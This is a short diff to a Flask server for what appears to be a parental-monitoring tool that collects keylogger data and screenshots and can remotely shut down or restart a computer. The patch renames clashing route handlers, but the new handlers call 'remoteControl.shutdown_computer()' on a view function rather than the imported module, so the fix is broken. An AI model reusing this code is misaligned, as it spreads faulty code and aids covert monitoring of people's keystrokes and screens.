@@ -5,7 +5,7 @@ import threading
 from server.parent import keyLogger_data
 from server.parent import keyLogger
 from server.receiveImageScreen import screenshots as parent_screenshots
-from server.remoteControl import shutdown, restart
+from server.remoteControl import shutdown_computer, restart_computer
 
 
 app = Flask(__name__)  # Specify the template folder explicitly
@@ -73,12 +73,12 @@ def remoteControl():
     return render_template('remote-control.html') 
  
 @app.route('/shutdown', methods=['POST'])
-def shutdown():
-    shutdown()
+def shutdown_route():
+    remoteControl.shutdown_computer()
     
 @app.route('/restart', methods=['POST'])
-def shutdown():
-    restart()
+def restart_route():
+    remoteControl.restart_computer()
 
     
 @app.route('/app-history')
